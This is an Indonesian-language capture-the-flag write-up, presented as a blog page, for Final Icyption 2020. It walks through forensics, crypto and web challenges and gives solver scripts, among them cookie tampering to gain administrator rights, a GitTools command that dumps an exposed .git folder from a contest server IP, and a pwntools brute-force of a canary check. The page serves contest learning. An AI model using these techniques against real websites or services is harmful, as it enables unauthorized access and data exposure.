@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+		<title>Final Icyption 2020 Writeup &middot; Abdullah</title>
+
+		
+  		<link rel="stylesheet" href="/css/style.css">
+		<link rel="stylesheet" href="/css/fonts.css">
+		
+		<link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+		<link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+		<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+		
+		<link href="" rel="alternate" type="application/rss+xml" title="Abdullah" />
+	</head>
+
+    <body>
+        		<nav class="nav">
+			<div class="nav-container">
+				<a href="/">
+					<h2 class="nav-title">Abdullah</h2>
+				</a>
+				<ul>
+    
+    
+        <li>
+            <a href="/about/">
+                
+                <span>About</span>
+                
+            </a>
+        </li>
+    
+        <li>
+            <a href="/posts/">
+                
+                <span>Posts</span>
+                
+            </a>
+        </li>
+    
+        <li>
+            <a href="/categories/">
+                
+                <span>Tags</span>
+                
+            </a>
+        </li>
+    
+</ul>
+			</div>
+		</nav>
+
+        
+
+<main>
+	<div class="post">
+		
+		<h1 class="post-title">Final Icyption 2020 Writeup</h1>
+<div class="post-line"></div>
+
+		
+
+
+		<p>Ini merupakan kompetisi CTF pertama yang saya ikuti, dan ini merupakan sebuah <em>kickstart</em> dan <em>abuse</em> untuk saya bahwa saya dapat berkontribusi di bidang ini. Special thanks to <em>bl33dz</em> yang telah mengundang saya untuk join ke tim nya (yang sebelumnya tim ini memiliki 3 anggota, karena sudah lulus satu diganti saya wkwk).</p>
+<p><img src="../img/scoreboard.png" alt="scoreboard">
+<em>Final scoreboard</em></p>
+<p>Yaaps, thats look like it. Kami menjuarai event tersebut, <em>yeay</em>. Tapi sayang, beasiswa hanya 1 untuk ketua tim, sad :'(</p>
+<h2 id="love-on-the-weekend">Love On The Weekend</h2>
+<p>Diberikan sebuah audio file yang bernama <code>love on the weekend.mp3</code>. Cek detail informasi file dengan <code>exiftool</code> didapat flag pada metadata <code>Lyrics</code>.</p>
+<p><img src="../img/1.png" alt="FLAG"></p>
+<h3 id="flag">Flag</h3>
+<p><code>icyption{Do_y0u_l1k3_J0hn_May3r}</code><br>
+<!-- raw HTML omitted --></p>
+<h2 id="bitcoin-make-you-rich">Bitcoin Make You Rich</h2>
+<p>Diberikan teks yang telah diencode yaitu sebagai berikut.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">J8pRND46rbHKmPuz4zWBNaWYzuo8uP6Kit4eFCnCgjGP7JWe8e9CVaK2LitS7CmeQdcCueM
+</code></pre></div><p>Sempat stuck beberapa jam, karena saya kira base85 yang ternyata base58. Decode dengan base58 2 kali dan didapatkan flag.</p>
+<p><img src="../img/2.png" alt="FLAG"></p>
+<h3 id="flag-1">Flag</h3>
+<p><code>icyption{satoshi_nakamoto_create_this}</code><br>
+<!-- raw HTML omitted --></p>
+<h2 id="something-wrong-with-this-drive">Something Wrong With This Drive</h2>
+<p>Diberikan sebuah file <code>data.img</code> dimana command <code>file</code> pada linux tidak dapat mengetahui informasi file <code>data.img</code> yang menandakan file tersebut corrupt.</p>
+<p>Fix file tersebut dengan <code>e2fsck</code> dan file berhasil diperbaiki.</p>
+<p><img src="../img/3.png" alt="FIX"></p>
+<p>Mount file dengan command <code>sudo mount data.img [dir]</code>, didapatkan file gambar yang memuat flag.</p>
+<p><img src="../img/4.jpg" alt="FLAG"></p>
+<h3 id="flag-2">Flag</h3>
+<p><code>icyption{f1n4lly_y0u_f1nd_m3}</code><br>
+<!-- raw HTML omitted --></p>
+<h2 id="wonderful-painting">Wonderful Painting</h2>
+<p>Diberikan file gambar bernama <code>blahblah.jpg</code>. Cek stereogram dengan stegsolve didapatkan flag tetapi sulit untuk dibaca. Cari tools online, didapatkan pada <code>https://magiceye.ecksdee.co.uk/</code>. Upload gambar dan geser-geser didapatkan flag seperti nama tim saya :)</p>
+<p><img src="../img/5.png" alt="FLAG"></p>
+<h3 id="flag-3">Flag</h3>
+<p><code>icyption{S3m0g4_K4mi_M3n4ng}</code><br>
+<!-- raw HTML omitted --></p>
+<h2 id="sniff-sniff">Sniff Sniff</h2>
+<p>Diberikan sebuah captured packet data (pcap) yang berisi banyak paket usb. Filter,</p>
+<pre><code>1. USB Transfer Type == 0x01
+2. Frame Length == 72
+3. Lalu, extract USB Data.
+</code></pre>
+<p>Extract dengan command</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ tshark -r monitor_snif.pcapng -Y <span style="color:#e6db74">&#39;usb.transfer_type == 0x01 &amp;&amp; frame.len == 72&#39;</span> -T fields -e usb.capdata &gt; usb-data.txt
+
+$ cat usb-data.txt | head
+00:00:16:00:00:00:00:00
+00:00:00:00:00:00:00:00
+00:00:18:00:00:00:00:00
+00:00:00:00:00:00:00:00
+00:00:16:00:00:00:00:00
+00:00:00:00:00:00:00:00
+00:00:04:00:00:00:00:00
+00:00:00:00:00:00:00:00
+00:00:0b:00:00:00:00:00
+00:00:00:00:00:00:00:00
+
+</code></pre></div><p>Selanjutnya dilakukan mapping dengan python, berikut solvernya.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/python</span>
+<span style="color:#75715e"># coding: utf8</span>
+
+KEYBOARD_CODES <span style="color:#f92672">=</span> {
+    <span style="color:#ae81ff">0x04</span>:[<span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;A&#39;</span>],    <span style="color:#ae81ff">0x05</span>:[<span style="color:#e6db74">&#39;b&#39;</span>, <span style="color:#e6db74">&#39;B&#39;</span>],    <span style="color:#ae81ff">0x06</span>:[<span style="color:#e6db74">&#39;c&#39;</span>, <span style="color:#e6db74">&#39;C&#39;</span>],    <span style="color:#ae81ff">0x07</span>:[<span style="color:#e6db74">&#39;d&#39;</span>, <span style="color:#e6db74">&#39;D&#39;</span>],
+    <span style="color:#ae81ff">0x08</span>:[<span style="color:#e6db74">&#39;e&#39;</span>, <span style="color:#e6db74">&#39;E&#39;</span>],    <span style="color:#ae81ff">0x09</span>:[<span style="color:#e6db74">&#39;f&#39;</span>, <span style="color:#e6db74">&#39;F&#39;</span>],    <span style="color:#ae81ff">0x0A</span>:[<span style="color:#e6db74">&#39;g&#39;</span>, <span style="color:#e6db74">&#39;G&#39;</span>],    <span style="color:#ae81ff">0x0B</span>:[<span style="color:#e6db74">&#39;h&#39;</span>, <span style="color:#e6db74">&#39;H&#39;</span>],
+    <span style="color:#ae81ff">0x0C</span>:[<span style="color:#e6db74">&#39;i&#39;</span>, <span style="color:#e6db74">&#39;I&#39;</span>],    <span style="color:#ae81ff">0x0D</span>:[<span style="color:#e6db74">&#39;j&#39;</span>, <span style="color:#e6db74">&#39;J&#39;</span>],    <span style="color:#ae81ff">0x0E</span>:[<span style="color:#e6db74">&#39;k&#39;</span>, <span style="color:#e6db74">&#39;K&#39;</span>],    <span style="color:#ae81ff">0x0F</span>:[<span style="color:#e6db74">&#39;l&#39;</span>, <span style="color:#e6db74">&#39;L&#39;</span>],
+    <span style="color:#ae81ff">0x10</span>:[<span style="color:#e6db74">&#39;m&#39;</span>, <span style="color:#e6db74">&#39;M&#39;</span>],    <span style="color:#ae81ff">0x11</span>:[<span style="color:#e6db74">&#39;n&#39;</span>, <span style="color:#e6db74">&#39;N&#39;</span>],    <span style="color:#ae81ff">0x12</span>:[<span style="color:#e6db74">&#39;o&#39;</span>, <span style="color:#e6db74">&#39;O&#39;</span>],    <span style="color:#ae81ff">0x13</span>:[<span style="color:#e6db74">&#39;p&#39;</span>, <span style="color:#e6db74">&#39;P&#39;</span>],
+    <span style="color:#ae81ff">0x14</span>:[<span style="color:#e6db74">&#39;q&#39;</span>, <span style="color:#e6db74">&#39;Q&#39;</span>],    <span style="color:#ae81ff">0x15</span>:[<span style="color:#e6db74">&#39;r&#39;</span>, <span style="color:#e6db74">&#39;R&#39;</span>],    <span style="color:#ae81ff">0x16</span>:[<span style="color:#e6db74">&#39;s&#39;</span>, <span style="color:#e6db74">&#39;S&#39;</span>],    <span style="color:#ae81ff">0x17</span>:[<span style="color:#e6db74">&#39;t&#39;</span>, <span style="color:#e6db74">&#39;T&#39;</span>],
+    <span style="color:#ae81ff">0x18</span>:[<span style="color:#e6db74">&#39;u&#39;</span>, <span style="color:#e6db74">&#39;U&#39;</span>],    <span style="color:#ae81ff">0x19</span>:[<span style="color:#e6db74">&#39;v&#39;</span>, <span style="color:#e6db74">&#39;V&#39;</span>],    <span style="color:#ae81ff">0x1A</span>:[<span style="color:#e6db74">&#39;w&#39;</span>, <span style="color:#e6db74">&#39;W&#39;</span>],    <span style="color:#ae81ff">0x1B</span>:[<span style="color:#e6db74">&#39;x&#39;</span>, <span style="color:#e6db74">&#39;X&#39;</span>],
+    <span style="color:#ae81ff">0x1C</span>:[<span style="color:#e6db74">&#39;y&#39;</span>, <span style="color:#e6db74">&#39;Y&#39;</span>],    <span style="color:#ae81ff">0x1D</span>:[<span style="color:#e6db74">&#39;z&#39;</span>, <span style="color:#e6db74">&#39;Z&#39;</span>],    <span style="color:#ae81ff">0x1E</span>:[<span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">&#39;!&#39;</span>],    <span style="color:#ae81ff">0x1F</span>:[<span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">&#39;@&#39;</span>],
+    <span style="color:#ae81ff">0x20</span>:[<span style="color:#e6db74">&#39;3&#39;</span>, <span style="color:#e6db74">&#39;#&#39;</span>],    <span style="color:#ae81ff">0x21</span>:[<span style="color:#e6db74">&#39;4&#39;</span>, <span style="color:#e6db74">&#39;$&#39;</span>],    <span style="color:#ae81ff">0x22</span>:[<span style="color:#e6db74">&#39;5&#39;</span>, <span style="color:#e6db74">&#39;%&#39;</span>],    <span style="color:#ae81ff">0x23</span>:[<span style="color:#e6db74">&#39;6&#39;</span>, <span style="color:#e6db74">&#39;^&#39;</span>],
+    <span style="color:#ae81ff">0x24</span>:[<span style="color:#e6db74">&#39;7&#39;</span>, <span style="color:#e6db74">&#39;&amp;&#39;</span>],    <span style="color:#ae81ff">0x25</span>:[<span style="color:#e6db74">&#39;8&#39;</span>, <span style="color:#e6db74">&#39;*&#39;</span>],    <span style="color:#ae81ff">0x26</span>:[<span style="color:#e6db74">&#39;9&#39;</span>, <span style="color:#e6db74">&#39;(&#39;</span>],    <span style="color:#ae81ff">0x27</span>:[<span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">&#39;)&#39;</span>],
+    <span style="color:#ae81ff">0x28</span>:[<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>],   <span style="color:#ae81ff">0x2C</span>:[<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39; &#39;</span>],    <span style="color:#ae81ff">0x2D</span>:[<span style="color:#e6db74">&#39;-&#39;</span>, <span style="color:#e6db74">&#39;_&#39;</span>],    <span style="color:#ae81ff">0x2E</span>:[<span style="color:#e6db74">&#39;=&#39;</span>, <span style="color:#e6db74">&#39;+&#39;</span>],
+    <span style="color:#ae81ff">0x2F</span>:[<span style="color:#e6db74">&#39;[&#39;</span>, <span style="color:#e6db74">&#39;{&#39;</span>],    <span style="color:#ae81ff">0x30</span>:[<span style="color:#e6db74">&#39;]&#39;</span>, <span style="color:#e6db74">&#39;}&#39;</span>],    <span style="color:#ae81ff">0x32</span>:[<span style="color:#e6db74">&#39;#&#39;</span>,<span style="color:#e6db74">&#39;~&#39;</span>],     <span style="color:#ae81ff">0x33</span>:[<span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">&#39;:&#39;</span>],
+    <span style="color:#ae81ff">0x34</span>:[<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&#34;&#39;</span>],   <span style="color:#ae81ff">0x36</span>:[<span style="color:#e6db74">&#39;,&#39;</span>, <span style="color:#e6db74">&#39;&lt;&#39;</span>],    <span style="color:#ae81ff">0x37</span>:[<span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#e6db74">&#39;&gt;&#39;</span>],    <span style="color:#ae81ff">0x38</span>:[<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>],
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;usb-data.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
+    usb_data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+
+usb_data <span style="color:#f92672">=</span> usb_data<span style="color:#f92672">.</span>split()
+extracted_data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+
+<span style="color:#66d9ef">for</span> data <span style="color:#f92672">in</span> usb_data:
+    data <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+    
+    shift <span style="color:#f92672">=</span> int(data[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">16</span>)
+    key <span style="color:#f92672">=</span> int(data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>)
+
+    <span style="color:#66d9ef">if</span> key <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+        <span style="color:#66d9ef">if</span> shift <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
+            extracted_data <span style="color:#f92672">+=</span> KEYBOARD_CODES[key][<span style="color:#ae81ff">1</span>]
+        <span style="color:#66d9ef">else</span>:
+            extracted_data <span style="color:#f92672">+=</span> KEYBOARD_CODES[key][<span style="color:#ae81ff">0</span>]
+
+<span style="color:#66d9ef">print</span>(extracted_data)
+
+</code></pre></div><p><img src="../img/6.png" alt="FLAG"></p>
+<p>Ternyata flag tidak benar. Hilangkan huruf <code>w</code> menjadi <code>W1r3sh4rk</code> dan perbaiki format flag, didapatkan flag yang benar.</p>
+<h3 id="flag-4">Flag</h3>
+<p><code>icyption{W1r3sh4rk_n0t_only_f0r_n3tw0rks}</code><br>
+<!-- raw HTML omitted --></p>
+<h2 id="any-information-on-this-website">Any Information On This Website</h2>
+<p>Diberikan link menuju website, klik button <code>LOGIN</code> agar diarahkan ke halaman login. Cek source dengan CTRL+U.
+Didapatkan teks yang terencode base64 <code>VkhKNUlHZDFaWE4wTDJkMVpYTjBDZz09Cg==</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ echo VkhKNUlHZDFaWE4wTDJkMVpYTjBDZz09Cg<span style="color:#f92672">==</span> | base64 -d | base64 -d
+Try guest/guest
+</code></pre></div><p>Login dengan credential yang didapat, lalu didapati clue selanjutnya pada konten halaman.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">it&#39;s cool that you logged in, but unfortunately we can only give the next clue to &#39;administrator&#39;. :(
+</code></pre></div><p>Cek cookie pada website, ditemukan cookie <code>auth</code> yang terdapat <code>username=guest</code> dimana merupakan credential untuk login tadi.</p>
+<p>Ubah cookie <code>guest</code> menjadi <code>administrator</code> (disini saya menggunakan EditThisCookie pada Chrome). Refresh halaman dan didapatkan informasi mengenai website.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">Congratulations, you&#39;re the administrator!
+I made this website using there tools
+- php
+- visual studio code
+- git
+- apache
+</code></pre></div><p>Akses folder git pada <code>http://180.250.135.6:8080/.git/</code> dan menampilkan <code>403 Forbidden</code> yang mana kita tidak diberi akses menuju path tersebut.</p>
+<p>Dump git dengan <a href="https://github.com/internetwache/GitTools">GitTools</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ ./gitdummper.sh http://180.250.135.6:8080/.git/ out
+</code></pre></div><p>Didapatkan flag pada file config.</p>
+<p><img src="../img/7.png" alt="FLAG"></p>
+<h3 id="flag-5">Flag</h3>
+<p><code>icyption{1N1_kaN_Y4Ng_kaMu_Cari_h3he}</code><br>
+<!-- raw HTML omitted --></p>
+<h2 id="hannah-needs-your-help">Hannah Needs Your Help</h2>
+<p>Diberikan list angka desimal, hasil enkripsi per-huruf flag dengan RSA. Diketahui nilai <code>N = 143</code>. Karena N kecil, penulis dapat langsung mengetahui faktor prima <code>p</code> dan <code>q</code> yaitu <code>11</code> dan <code>13</code>.</p>
+<p>Atau dengan menggunakan <code>factordb.com</code> untuk mencari prima <code>p dan q</code>.</p>
+<p>Dilakukan bruteforce nilai <code>e</code> dari <code>0-65537</code> karena <code>e</code> belum diketahui. Berikut solvernya.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># -*- coding: utf8 -*-</span>
+
+<span style="color:#f92672">import</span> gmpy2
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(e, cipher):
+    N <span style="color:#f92672">=</span> <span style="color:#ae81ff">143</span>; p <span style="color:#f92672">=</span> <span style="color:#ae81ff">11</span>; q <span style="color:#f92672">=</span> <span style="color:#ae81ff">13</span>
+    phi <span style="color:#f92672">=</span> (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+    result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> cipher:
+        d <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>invert(e, phi)
+        result <span style="color:#f92672">+=</span> chr(pow(c, d, N))
+    <span style="color:#66d9ef">return</span> result
+
+cipher <span style="color:#f92672">=</span> [<span style="color:#ae81ff">118</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">118</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">116</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">5</span>]
+
+<span style="color:#66d9ef">for</span> e <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x10001</span>):
+    <span style="color:#66d9ef">try</span>:
+        msg <span style="color:#f92672">=</span> decrypt(e, cipher)
+        <span style="color:#66d9ef">if</span> msg<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;icyption&#39;</span>):
+            <span style="color:#66d9ef">print</span>(msg)
+            <span style="color:#66d9ef">break</span>
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">pass</span>
+</code></pre></div><p>Jalankan dan didapatkan flag.</p>
+<p><img src="../img/8.png" alt="FLAG"></p>
+<h3 id="flag-6">Flag</h3>
+<p><code>icyption{m3m4ng_r4d4_r4d4_sus4h_jug4}</code><br>
+<!-- raw HTML omitted --></p>
+<h2 id="canary-birds">Canary Birds</h2>
+<p>Awalnya hanya diberikan service nc saja tidak ada file binary-nya sampai ada yang tanya jurinya.</p>
+<p><img src="../img/9.png" alt="DISCORD">
+*<em>maaf nama tidak disensor.</em></p>
+<p>Akhirnya file binary-nya dibagi, dan didalamnya terdapat flag XD.</p>
+<p>Tapi disini penulis mengerjakan seperti apa yang dikatakan juri.</p>
+<p><img src="../img/10.png" alt="DISCORD"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ python -c <span style="color:#e6db74">&#39;print &#34;A&#34;*17&#39;</span> | ./source 
+saya akan mengulang perkataan ada. masukkan karakter! anda memasukkan : AAAAAAAAAAAAAAAAA
+
+$ python -c <span style="color:#e6db74">&#39;print &#34;A&#34;*18&#39;</span> | ./source 
+saya akan mengulang perkataan ada. masukkan karakter! anda memasukkan : AAAAAAAAAAAAAAAAAA
+
+$ python -c <span style="color:#e6db74">&#39;print &#34;A&#34;*20&#39;</span> | ./source 
+saya akan mengulang perkataan ada. masukkan karakter! ERROR! karaktermu kepanjangan!
+</code></pre></div><p>Ditemukan pada saat input 20 karakter, program menampikan error. Selanjutnya dilakukan bruteforce karakter (yang dimaksud seperti canary) dan didapatkan flag ketika karakter ke-21 adalah <code>%</code>.</p>
+<p><img src="../img/11.png" alt="FLAG"></p>
+<p>Berikut solvernya.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/python</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;warn&#34;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send</span>(payload):
+    p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./source&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;! &#34;</span>, payload)
+    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recv()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brute_canary</span>():
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
+        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">20</span> <span style="color:#f92672">+</span> chr(i)
+        resp <span style="color:#f92672">=</span> send(payload)
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;ERROR!&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> resp:
+            <span style="color:#66d9ef">print</span>(resp)
+            <span style="color:#66d9ef">break</span>
+        
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    brute_canary()
+
+</code></pre></div><h3 id="flag-7">Flag</h3>
+<p><code>icyption{m4u_d4p3t_b34s1sw4}</code><br>
+<!-- raw HTML omitted --></p>
+<p>Berikut hasil decompile binary menggunakan IDA.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+{
+  <span style="color:#66d9ef">int</span> result; <span style="color:#75715e">// eax@2
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// rcx@4
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> src[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// [sp+10h] [bp-90h]@1
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v6; <span style="color:#75715e">// [sp+30h] [bp-70h]@1
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v7; <span style="color:#75715e">// [sp+44h] [bp-5Ch]@1
+</span><span style="color:#75715e"></span>  _BYTE v8[<span style="color:#ae81ff">3</span>]; <span style="color:#75715e">// [sp+45h] [bp-5Bh]@3
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v9; <span style="color:#75715e">// [sp+98h] [bp-8h]@1
+</span><span style="color:#75715e"></span>
+  v9 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>MK_FP(__FS__, <span style="color:#ae81ff">40LL</span>);
+  setbuf(_bss_start, <span style="color:#ae81ff">0LL</span>);
+  strcpy(src, <span style="color:#e6db74">&#34;icyption{m4u_d4p3t_b34s1sw4}&#34;</span>);
+  v7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">37</span>;
+  printf(<span style="color:#e6db74">&#34;saya akan mengulang perkataan ada. masukkan karakter! &#34;</span>, <span style="color:#ae81ff">0LL</span>);
+  __isoc99_scanf(<span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#f92672">&amp;</span>v6);
+  <span style="color:#66d9ef">if</span> ( <span style="color:#ae81ff">37</span> <span style="color:#f92672">==</span> v7 )
+  {
+    strcpy(v8, src);
+    printf(<span style="color:#e6db74">&#34;anda memasukkan : %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>v6);
+    result <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  }
+  <span style="color:#66d9ef">else</span>
+  {
+    printf(<span style="color:#e6db74">&#34;ERROR! karaktermu kepanjangan!&#34;</span>);
+    result <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+  }
+  v4 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>MK_FP(__FS__, <span style="color:#ae81ff">40LL</span>) <span style="color:#f92672">^</span> v9;
+  <span style="color:#66d9ef">return</span> result;
+}
+</code></pre></div><p>Admin Mistake. Harusnya menggunakan fungsi <code>fopen()</code> dalam C untuk mendapatkan value flag. Karena kalau seperti ini malah lebih ke-reversing kata salah satu peserta.</p>
+<p><img src="../img/12.png" alt="DISCORD">
+<!-- raw HTML omitted --></p>
+<h2 id="penutup">Penutup</h2>
+<p>Masukkan untuk juri, kalau tidak ada pembahasan soal katakan saja tidak ada. Ini sudah tanggal berapa :v</p>
+<p><img src="../img/13.png" alt="DISCORD"></p>
+<p>Jika ada yang keberatan karena saya tidak sensor nama, bisa hubungi saya dan saya akan edit postingan ini, terimakasih panitia.</p>
+<p>Alhamdullillah <code>Semoga Menang</code> menjadi menang beneran :).</p>
+
+
+		
+	</div>
+
+	<div class="pagination">
+		<a href="/posts/grimmcon/pwn/" class="right arrow">&#8594;</a>
+
+		<a href="#" class="top">Top</a>
+	</div>
+</main>
+
+
+        		<footer>
+			
+			<span>
+			&copy; <time datetime="2021-01-09 10:21:18.457837137 &#43;0700 WIB m=&#43;2.412759967">2021</time> . Made with <a href='https://gohugo.io'>Hugo</a> using the <a href='https://github.com/EmielH/tale-hugo/'>Tale</a> theme.
+			</span>
+		</footer>
+
+    </body>
+</html>
